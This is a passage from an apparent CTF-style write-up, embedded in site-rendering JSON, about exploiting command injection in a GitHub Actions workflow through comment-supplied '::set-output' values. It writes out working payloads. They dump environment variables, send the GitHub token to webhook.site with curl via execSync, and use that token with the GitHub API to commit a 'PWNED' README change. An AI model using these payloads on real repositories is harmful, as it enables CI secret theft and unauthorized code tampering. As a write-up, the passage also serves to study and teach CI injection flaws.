steps"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"."}]},{"type":"text","value":"comment_log"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"."}]},{"type":"text","value":"outputs"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"."}]},{"type":"element","tagName":"span","properties":{"className":["token","constant"]},"children":[{"type":"text","value":"COMMENT_ID"}]},{"type":"text","value":" "},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"}"}]},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"}"}]}]}]},{"type":"text","value":"\n      "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"\n  "},{"type":"element","tagName":"a","properties":{"className":["gatsby-resp-image-link"],"href":"/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-9058b.jpeg","style":"display: block","target":"_blank","rel":["noopener"]},"children":[{"type":"text","value":"\n  \n  "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-wrapper"],"style":"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"},"children":[{"type":"text","value":"\n    "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-background-image"],"style":"padding-bottom: 52.57270693512305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"img","properties":{"className":["gatsby-resp-image-image"],"style":"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;","alt":"github-action-log-process","title":"","src":"/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-78f2b.jpeg","srcSet":["/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-dce19.jpeg 200w","/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-c1413.jpeg 400w","/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-78f2b.jpeg 800w","/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-ab4c4.jpeg 1200w","/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-bc99b.jpeg 1600w","/static/github-action-log-process-3d1604496fb0d052e6c3f256e83de475-9058b.jpeg 1788w"],"sizes":["(max-width:","800px)","100vw,","800px"]},"children":[]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n  "}]},{"type":"text","value":"\n  \n  "}]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Time to print out the enviroment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::set-output name=COMMENT_ID::true ;console.log(process.env);"}]},{"type":"text","value":"."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"\n  "},{"type":"element","tagName":"a","properties":{"className":["gatsby-resp-image-link"],"href":"/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-53225.png","style":"display: block","target":"_blank","rel":["noopener"]},"children":[{"type":"text","value":"\n  \n  "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-wrapper"],"style":"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"},"children":[{"type":"text","value":"\n    "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-background-image"],"style":"padding-bottom: 49.32291666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"img","properties":{"className":["gatsby-resp-image-image"],"style":"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;","alt":"github-action-leak-env","title":"","src":"/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-48538.png","srcSet":["/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-bed0f.png 200w","/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-5fd34.png 400w","/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-48538.png 800w","/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-b70ec.png 1200w","/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-d134a.png 1600w","/static/github-action-leak-env-d3f51d075469b476d30af6e54ba6269d-53225.png 1920w"],"sizes":["(max-width:","800px)","100vw,","800px"]},"children":[]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n  "}]},{"type":"text","value":"\n  \n  "}]},{"type":"text","value":"\n    "}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync('curl https://webhook.site/REDACTED?token=' + process.env[\"INPUT_GITHUB-TOKEN\"]);"}]},{"type":"text","value":". I did the same for “ACTIONS"},{"type":"element","tagName":"em","properties":{},"children":[{"type":"text","value":"RUNTIME"}]},{"type":"text","value":"TOKEN”."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the “README.md” file. I spent quite a few time researching the API but the solution is below."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"My Solution"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header 'authorization: Bearer ${process.env[\"INPUT_GITHUB-TOKEN\"]}' --header 'content-type: application/json' --data '{ \"message\": \"PWNED!!!!\", \"content\": \"V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh\", \"sha\": \"959c46eb0fbab9ab5b5bfb279ab6d70f720d1207\" }' --fail`);"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"\n  "},{"type":"element","tagName":"a","properties":{"className":["gatsby-resp-image-link"],"href":"/static/pwned-024f59b9cb45831ef6006c944d963db9-9058b.jpeg","style":"display: block","target":"_blank","rel":["noopener"]},"children":[{"type":"text","value":"\n  \n  "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-wrapper"],"style":"position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"},"children":[{"type":"text","value":"\n    "},{"type":"element","tagName":"span","properties":{"className":["gatsby-resp-image-background-image"],"style":"padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,'); background-size: cover; display: block;"},"children":[{"type":"text","value":"\n      "},{"type":"element","tagName":"img","properties":{"className":["gatsby-resp-image-image"],"style":"width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;","alt":"pwned